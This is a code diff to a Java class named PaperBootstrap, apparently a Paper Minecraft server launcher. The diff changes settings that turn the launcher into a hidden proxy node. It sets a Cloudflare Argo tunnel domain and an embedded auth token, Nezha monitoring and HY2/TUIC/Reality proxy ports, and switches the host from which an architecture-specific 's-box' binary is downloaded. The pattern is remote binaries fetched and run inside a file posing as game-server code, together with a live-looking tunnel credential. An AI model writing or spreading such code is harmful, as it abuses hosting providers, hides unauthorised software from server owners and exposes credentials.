@@ -98,8 +98,8 @@ public final class PaperBootstrap {
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "weirdhostminecraft.19861123.tech");
-        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiMzcxZmE4ZWYtY2UwOS00NGI2LTk4NzItYzM0ZjIzZmQ1MGY2IiwicyI6Ik1qVXhZamRrWkdNdFpHRm1OaTAwTWpCakxXSmxZemN0TUdReU1qQTJZV0ZsTkRBeiJ9");
+        envVars.put("ARGO_DOMAIN", "dracobyte.19861123.tech");
+        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiOWE5MGViNjItN2FiOS00YWQ3LThlYWItZGVkYjA5ZmIwNmY3IiwicyI6IlpUUXdORGswTldZdFlXVTBPQzAwWkRobExXRmxaV010WWpFeE1HTmpZamcxWVRReSJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
@@ -108,7 +108,7 @@ public final class PaperBootstrap {
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "weirdhostminecraft");
+        envVars.put("NAME", "dracobyte");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -146,7 +146,7 @@ public final class PaperBootstrap {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://amd64.sss.hidns.vip/s-box";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
             url = "https://arm64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("s390x")) {
